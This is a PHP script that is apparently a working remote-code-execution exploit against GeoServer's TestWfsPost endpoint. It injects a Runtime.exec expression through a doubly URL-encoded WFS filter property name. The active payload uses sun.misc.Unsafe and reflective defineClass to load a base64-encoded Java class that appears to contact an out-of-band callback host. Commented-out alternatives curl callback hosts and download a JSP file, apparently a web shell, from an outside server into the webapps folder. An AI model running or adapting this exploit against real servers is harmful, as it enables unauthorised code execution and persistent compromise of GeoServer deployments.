<?php

//$cmd = 'curl dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun';

//$cmd = 'touch webapps/test.jsp';
//$cmd = 'curl -o webapps/pwned2/test.jsp sbnke.com/viewer.jsp';
$cmd = 'import sun.misc.Unsafe; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.Base64; public class UnsafeTest { public static void test() { try { String payload = "yv66vgAAAEIAKgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAqcXduc2x0cHR2Ym9vZHR0cml2aXl1MG9jZ3htcDB6MjI4Lm9hc3QuZnVuCgAKAAsHAAwMAA0ADgEAFGphdmEvbmV0L0luZXRBZGRyZXNzAQAJZ2V0QnlOYW1lAQAqKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvSW5ldEFkZHJlc3M7CgAKABAMABEAEgEAC2lzUmVhY2hhYmxlAQAEKEkpWgkAFAAVBwAWDAAXABgBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07CAAaAQAPUGluZyBzdWNjZXNzZnVsCgAcAB0HAB4MAB8AIAEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWBwAiAQAIUGluZ1Rlc3QBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAJwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAApTb3VyY2VGaWxlAQANUGluZ1Rlc3QuamF2YQAhACEAAgAAAAAAAQABAAUABgACACMAAAA9AAIAAQAAABkqtwABEge4AAkRE4i2AA9XsgATEhm2ABuxAAAAAQAkAAAAEgAEAAAABAAEAAUAEAAGABgABwAlAAAABAABACYAAQAoAAAAAgAp"; Class&lt;?&gt; unSafe=Class.forName("sun.misc.Unsafe"); Field unSafeField=unSafe.getDeclaredField("theUnsafe"); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); Module baseModule=Object.class.getModule(); Class&lt;?&gt; currentClass= UnsafeTest.class; long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module")); unSafeClass.getAndSetObject(currentClass,addr,baseModule); Class&lt;?&gt; byteArrayClass = Class.forName("[B"); Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byteArrayClass, int.class, int.class); defineClass.setAccessible(true); Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", Base64.getDecoder().decode(payload), 0, Base64.getDecoder().decode(payload).length); calc.newInstance(); }catch (Exception e){} } } UnsafeTest.test();';
//$cmd = 'curl -o webapps/pwned2/test.jsp sbnke.com/viewer.jsp';
//$cmd = 'curl -o webapps/pwned2/test.jsp sbnke.com/viewer.jsp';


$prim = 'PropertyName>exec(java.lang.Runtime.getRuntime(),"'.$cmd.'")</PropertyName';
$code = urlencode(urlencode($prim));
//$code = 'PropertyName%253Eexec%2528java.lang.Runtime.getRuntime%2528%2529%252C%2522curl%2Bdgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun%2522%2529%253C%2FPropertyName';
$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs%3Frequest%3DGetFeature%26version%3D1.0.0%26typeName%3Dnrs%3Apf_markets%26outputFormat%3DGML2%26FILTER%3D%253CFilter%2520xmlns%3D%2522http%3A%2F%2Fwww.opengis.net%2Fogc%2522%2520xmlns%3Agml%3D%2522http%3A%2F%2Fwww.opengis.net%2Fgml%2522%253E%253CIntersects%253E%253C'.$code.'%253E%253Cgml%3APoint%2520srsName%3D%2522EPSG%3A4326%2522%253E%253Cgml%3Acoordinates%253E-74.817265%2C40.5296504%253C%2Fgml%3Acoordinates%253E%253C%2Fgml%3APoint%253E%253C%2FIntersects%253E%253C%2FFilter%253E&body=&username=&password=',
  CURLOPT_HTTPHEADER => array(
    'host: 192.168.2.160:8080',
    'proxy-connection: keep-alive',
    'content-length: 719',
    'cache-control: max-age=0',
    'origin: http://192.168.2.160:8080',
    'content-type: application/x-www-form-urlencoded',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: http://192.168.2.160:8080/geoserver/web/wicket/page?3',
    'accept-encoding: gzip, deflate',
    'accept-language: en-US,en;q=0.9',
    'cookie: JSESSIONID=88F6CED4019998E2D9A508593B117151'
  ),
));

$response = curl_exec($curl);

curl_close($curl);
echo $response;